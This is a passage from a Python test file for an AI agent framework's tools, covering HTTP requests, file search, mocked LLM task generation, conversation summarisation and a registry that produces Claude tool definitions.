        tool = HttpTool()
        result = tool.safe_execute(action="get", url="")
        assert not result.success

    def test_http_get_real(self):
        """HTTP GET actually works against a real endpoint."""
        from hands.tools.http import HttpTool
        tool = HttpTool()
        # Use httpbin or a known-stable endpoint
        result = tool.safe_execute(action="head", url="https://httpbin.org/get")
        # May fail network-wise but validates the tool runs
        assert isinstance(result.success, bool)


# ============================================================
# Search Tool Tests
# ============================================================

class TestSearchTool:
    def test_grep_finds_pattern(self, tmp_workspace):
        """Grep finds text in files."""
        from hands.tools.search import SearchTool
        # Create test file
        with open(os.path.join(tmp_workspace, "test.py"), "w") as f:
            f.write("def hello_world():\n    return 'hello'\n")

        tool = SearchTool()
        result = tool.safe_execute(action="grep", path=tmp_workspace, pattern="hello_world")
        assert result.success
        assert "hello_world" in result.output

    def test_grep_no_match(self, tmp_workspace):
        """Grep returns no matches gracefully."""
        from hands.tools.search import SearchTool
        with open(os.path.join(tmp_workspace, "test.py"), "w") as f:
            f.write("nothing here\n")

        tool = SearchTool()
        result = tool.safe_execute(action="grep", path=tmp_workspace, pattern="nonexistent_xyz")
        assert result.success  # grep returns success even with no matches
        assert "no matches" in result.output.lower() or result.metadata.get("matches", 0) == 0

    def test_find_files(self, tmp_workspace):
        """Find locates files by pattern."""
        from hands.tools.search import SearchTool
        # Create test files
        with open(os.path.join(tmp_workspace, "app.py"), "w") as f:
            f.write("# app")
        with open(os.path.join(tmp_workspace, "utils.py"), "w") as f:
            f.write("# utils")
        with open(os.path.join(tmp_workspace, "readme.md"), "w") as f:
            f.write("# readme")

        tool = SearchTool()
        result = tool.safe_execute(action="find", path=tmp_workspace, pattern="*.py")
        assert result.success
        assert "app.py" in result.output
        assert "utils.py" in result.output
        assert "readme.md" not in result.output

    def test_count_lines_file(self, tmp_workspace):
        """Count lines for a single file."""
        from hands.tools.search import SearchTool
        filepath = os.path.join(tmp_workspace, "test.py")
        with open(filepath, "w") as f:
            f.write("line1\nline2\nline3\n")

        tool = SearchTool()
        result = tool.safe_execute(action="count_lines", path=filepath)
        assert result.success
        assert "3" in result.output

    def test_search_requires_pattern_for_grep(self):
        """Grep requires a pattern."""
        from hands.tools.search import SearchTool
        tool = SearchTool()
        result = tool.safe_execute(action="grep", path="/tmp")
        assert not result.success
        assert "pattern" in result.error.lower()


# ============================================================
# Task Generator Tests
# ============================================================

class TestTaskGenerator:
    @patch("hands.task_generator.create_message")
    def test_generate_tasks_returns_list(self, mock_create):
        """Task generator returns a list of tasks."""
        from hands.task_generator import generate_tasks

        mock_response = MagicMock()
        mock_response.usage.input_tokens = 100
        mock_response.usage.output_tokens = 200
        mock_block = MagicMock()
        mock_block.text = json.dumps([
            {"task": "Build a React component library", "reasoning": "Apply KB claims", "priority": 1,
             "applies_claims": ["Use TypeScript"], "expected_complexity": "medium",
             "builds_on": "none", "success_criteria": "All tests pass"},
            {"task": "Build a REST API", "reasoning": "Practice patterns", "priority": 2,
             "applies_claims": [], "expected_complexity": "high",
             "builds_on": "none", "success_criteria": "API responds"},
        ])
        mock_response.content = [mock_block]
        mock_create.return_value = mock_response

        tasks = generate_tasks("test-domain")
        assert len(tasks) == 2
        assert tasks[0]["task"] == "Build a React component library"

    @patch("hands.task_generator.create_message")
    def test_get_next_task_returns_string(self, mock_create):
        """get_next_task returns a string."""
        from hands.task_generator import get_next_task

        mock_response = MagicMock()
        mock_response.usage.input_tokens = 100
        mock_response.usage.output_tokens = 200
        mock_block = MagicMock()
        mock_block.text = json.dumps([
            {"task": "Build something cool", "reasoning": "why not", "priority": 1,
             "applies_claims": [], "expected_complexity": "low",
             "builds_on": "none", "success_criteria": "tests pass"},
        ])
        mock_response.content = [mock_block]
        mock_create.return_value = mock_response

        task = get_next_task("test-domain")
        assert isinstance(task, str)
        assert "Build something cool" in task


# ============================================================
# Enhanced Executor Tests
# ============================================================

class TestEnhancedExecutor:
    def test_context_summarization(self):
        """Context compression reduces conversation size."""
        from hands.executor import _summarize_old_steps, _estimate_conversation_size

        # Build a long conversation
        conversation = [
            {"role": "user", "content": "Execute this plan..." + "x" * 1000},
        ]
        for i in range(20):
            conversation.append({"role": "assistant", "content": f"Step {i} action" + "y" * 500})
            conversation.append({"role": "user", "content": f"TOOL RESULT (step {i+1}):\nSUCCESS: output {i}" + "z" * 500})

        original_size = _estimate_conversation_size(conversation)
        compressed = _summarize_old_steps(conversation, keep_recent=6)
        compressed_size = _estimate_conversation_size(compressed)

        assert compressed_size < original_size
        # First message preserved
        assert compressed[0]["content"].startswith("Execute this plan")
        # Recent messages preserved
        assert len(compressed) <= 8  # first + summary + 6 recent

    def test_conversation_size_estimation(self):
        """Size estimation works correctly."""
        from hands.executor import _estimate_conversation_size

        conv = [
            {"role": "user", "content": "hello"},
            {"role": "assistant", "content": "world"},
        ]
        assert _estimate_conversation_size(conv) == 10


# ============================================================
# Registry with new tools
# ============================================================

class TestExpandedRegistry:
    def test_registry_has_all_tools(self):
        """Default registry has all 5 tools."""
        from hands.tools.registry import create_default_registry
        registry = create_default_registry()
        tools = registry.list_tools()
        assert "code" in tools
        assert "terminal" in tools
        assert "git" in tools
        assert "http" in tools
        assert "search" in tools
        assert len(tools) == 5

    def test_registry_claude_tools_format(self):
        """All tools produce valid Claude tool definitions."""
        from hands.tools.registry import create_default_registry
        registry = create_default_registry()
        claude_tools = registry.get_claude_tools()
        assert len(claude_tools) == 5
        for tool in claude_tools:
            assert "name" in tool
            assert "description" in tool
            assert "input_schema" in tool
            assert tool["input_schema"]["type"] == "object"

    def test_registry_tool_descriptions(self):
        """Tool descriptions are informative."""
        from hands.tools.registry import create_default_registry
        registry = create_default_registry()
        desc = registry.get_tool_descriptions()
        assert "code" in desc
        assert "terminal" in desc
        assert "git" in desc
        assert "http" in desc
        assert "search" in desc
